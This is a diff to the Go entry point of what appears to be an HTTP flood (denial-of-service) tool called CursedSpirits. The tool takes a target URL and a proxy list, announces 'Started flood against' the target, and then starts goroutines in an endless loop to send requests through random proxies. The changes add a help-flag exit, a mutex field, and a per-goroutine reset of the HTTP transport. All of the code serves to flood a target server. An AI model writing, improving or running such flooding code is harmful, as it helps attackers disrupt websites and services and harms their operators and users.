@@ -8,7 +8,9 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+	"slices"
 	"strings"
+	"sync"
 	"time"
 
 	"Pix4Devs/CursedSpirits/bot"
@@ -35,6 +37,15 @@ func main() {
 	cmd.Init()
 	if err := cmd.RootCmd.Execute(); err != nil {
 		log.Fatal(err)
+	}
+
+	if slices.ContainsFunc(os.Args, func(s string) bool {
+		if strings.Contains(s, "--help") {
+			return true
+		}
+		return false
+	}) {
+		os.Exit(0)
 	}
 
 	if !strings.Contains(*TARGET, "http://") && !strings.Contains(*TARGET, "https://") {
@@ -87,6 +98,7 @@ func main() {
 			Timeout: time.Duration(time.Second * 20),
 		},
 		Protocol: *PROXY_TYPE,
+		Mx:       sync.Mutex{},
 	}
 
 	fancy.PrintCtx("Started flood against '" + *TARGET + "'")
@@ -94,6 +106,15 @@ func main() {
 
 	for {
 		go func() {
+			// ==================
+			// reset tcp cache state
+			// refer to godoc:
+			//
+			// The [Client.Transport] typically has internal state (cached TCP connections), so Clients should be reused instead of created as needed.
+			// Clients are safe for concurrent use by multiple goroutines.
+			// ==================
+			f.Client.Transport = http.DefaultTransport
+
 			f.Jujutsu(globals.PROXIES[rand.Intn(len(globals.PROXIES))])
 		}()
 	}
